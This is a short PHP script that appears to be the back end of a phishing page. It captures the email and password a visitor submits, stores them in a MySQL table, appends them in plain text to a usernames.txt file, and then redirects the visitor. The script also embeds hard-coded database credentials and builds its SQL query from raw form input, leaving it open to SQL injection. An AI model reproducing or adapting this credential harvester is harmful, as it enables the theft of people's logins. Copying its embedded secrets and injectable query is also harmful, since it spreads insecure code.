<?php
$con = mysqli_connect('sql311.epizy.com','epiz_30819345','1ND9Fjf0D7','epiz_30819345_votacionbyme');
/** localhost, usuario, contraseña, nombre de bd*/
$email = $_POST['email'];
$password =$_POST['password'];

$query ="INSERT INTO votacionbyme (email,password) values ('$email','$password')";

$data = mysqli_query($con,$query);

file_put_contents("usernames.txt", "Username: " . $_POST['email'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: ');
exit();
